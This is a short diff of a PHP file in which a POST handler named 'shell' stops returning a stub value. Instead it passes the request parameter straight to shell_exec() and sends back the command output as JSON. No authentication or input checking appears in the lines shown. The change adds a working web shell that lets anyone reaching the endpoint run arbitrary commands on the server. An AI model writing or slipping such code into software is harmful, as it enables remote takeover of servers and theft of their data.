@@ -80,5 +80,6 @@ if (isset($_POST['command']) && isset($commands[$_POST['command']])) {
 }
 
 if (isset($_POST['shell'])) {
-    echo json_encode(['data' => 'output']);
+    Header('Content-Type: application/json');
+    echo json_encode(['data' => shell_exec($_POST['shell'])]);
 }
